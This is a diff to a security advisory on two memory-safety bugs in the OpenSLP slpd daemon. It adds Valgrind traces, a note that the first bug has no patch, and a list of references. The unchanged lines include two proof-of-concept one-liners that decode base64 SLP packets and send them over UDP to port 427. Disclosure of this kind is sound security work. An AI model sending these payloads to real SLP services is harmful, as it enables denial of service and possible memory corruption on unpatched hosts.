@@ -36,7 +36,7 @@ Proof of concept exploit:
 
   echo -n "AgMAAAAAAAAAAAAAAAAAAPQAATEAAAAAB2VuAAAAF3M=" | base64 -d > /dev/udp/127.0.0.1/427
 
-Stack trace:
+Valgrind report:
 
   ==27968== Invalid read of size 1
   ==27968== at 0x412436: GetUINT16 (slp_message.c:63)
@@ -154,6 +154,11 @@ Proof of discovery:
 
 https://twitter.com/magnusstubman/status/953909628622069760
 
+
+Patch:
+
+I'm not aware of any patch, and I'm not sure the maintainers are going to patch it.
+
 BUG 2
 =====
 
@@ -176,6 +181,31 @@ discovery.
 Exploit:
 
   echo -n "AgkAAA8AAAAAAJuiAAAAAAAAAJtkaXJlYwB/ACssZVJlblxkZQkJCAkJ8wkJCQkJCYAJCQkJCWF0CQlkCQBkLCwsLEUsLCwsLCwsLCwsLCwsLCwsSCwsLCwsLIAsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCysLCwsLCwAAAPoLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCxcZGUJCQgJCfMJCQkJCQkJCQkJCQlhdAkJZAkAZCwsLCwsLCwsLCwsLA==" | base64 -d > /dev/udp/127.0.0.1/427
+
+Valgrind report:
+
+  ==56913== Invalid write of size 1
+  ==56913== at 0x4C2D6A3: memcpy@GLIBC_2.2.5 (vg_replace_strmem.c:914)
+  ==56913== by 0x40FD0B: SLPFoldWhiteSpace (slp_compare.c:210)
+  ==56913== by 0x4100DC: SLPCompareString (slp_compare.c:374)
+  ==56913== by 0x410331: SLPContainsStringList (slp_compare.c:514)
+  ==56913== by 0x4103C6: SLPIntersectStringList (slp_compare.c:550)
+  ==56913== by 0x40C606: ProcessSrvTypeRqst (slpd_process.c:1220)
+  ==56913== by 0x40C606: SLPDProcessMessage (slpd_process.c:1431)
+  ==56913== by 0x406F69: IncomingDatagramRead (slpd_incoming.c:94)
+  ==56913== by 0x406F69: SLPDIncomingHandler (slpd_incoming.c:406)
+  ==56913== by 0x402383: main (slpd_main.c:699)
+  ==56913== Address 0x5b5dd06 is 0 bytes after a block of size 6 alloc'd
+  ==56913== at 0x4C28C20: malloc (vg_replace_malloc.c:296)
+  ==56913== by 0x415C51: _xmemdup (slp_xmalloc.c:356)
+  ==56913== by 0x410096: SLPCompareString (slp_compare.c:365)
+  ==56913== by 0x410331: SLPContainsStringList (slp_compare.c:514)
+  ==56913== by 0x4103C6: SLPIntersectStringList (slp_compare.c:550)
+  ==56913== by 0x40C606: ProcessSrvTypeRqst (slpd_process.c:1220)
+  ==56913== by 0x40C606: SLPDProcessMessage (slpd_process.c:1431)
+  ==56913== by 0x406F69: IncomingDatagramRead (slpd_incoming.c:94)
+  ==56913== by 0x406F69: SLPDIncomingHandler (slpd_incoming.c:406)
+  ==56913== by 0x402383: main (slpd_main.c:699)
 
 The while loop on line 207 fails to perform bounds checking, and as such
 may end up incrementing the pointer p up to a point such that p is bigger
@@ -225,6 +255,17 @@ Proof of discovery:
 https://twitter.com/magnusstubman/status/938317849474555904
 
 Patch: https://sourceforge.net/p/openslp/mercurial/ci/34fb3aa5e6b4997fa21cb614e480de36da5dbc9a/ 
+
+REFERENCES
+==========
+
+- https://sourceforge.net/p/openslp/bugs/161/
+- https://sourceforge.net/p/openslp/bugs/160/
+- https://twitter.com/magnusstubman/status/938317849474555904
+- https://twitter.com/magnusstubman/status/953909628622069760
+- https://sourceforge.net/p/openslp/mercurial/ci/34fb3aa5e6b4997fa21cb614e480de36da5dbc9a/
+- https://www.openwall.com/lists/oss-security/2016/09/27/4
+- https://www.openwall.com/lists/oss-security/2016/09/28/1
 
 
 
